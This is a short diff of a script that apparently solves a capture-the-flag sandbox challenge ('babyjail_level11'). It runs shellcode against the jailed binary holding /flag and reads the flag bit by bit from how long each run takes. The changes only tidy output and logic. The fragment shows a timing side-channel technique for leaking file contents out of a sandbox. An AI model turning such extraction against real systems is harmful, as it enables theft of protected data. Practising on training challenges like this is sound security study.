@@ -32,14 +32,13 @@ for i in range(100):
         start=$(date +%s)
         ./babyjail_level11 /flag < /tmp/shellcode.bin 1>/dev/null 2>/dev/null
         end=$(date +%s)
-        echo "Elapsed time: $(($end-$start)) s"
+        #echo "Elapsed time: $(($end-$start)) s"
         exit  $(($end-$start))
         """.format(shellcode.format(i,j))) // 0x100
         if t>=4:
             t=1
-        elif t<4:
+        else:
             t=0
-        #print(t,end='')
         c+=str(t)
     c=int(c[::-1],2)
     if not c:
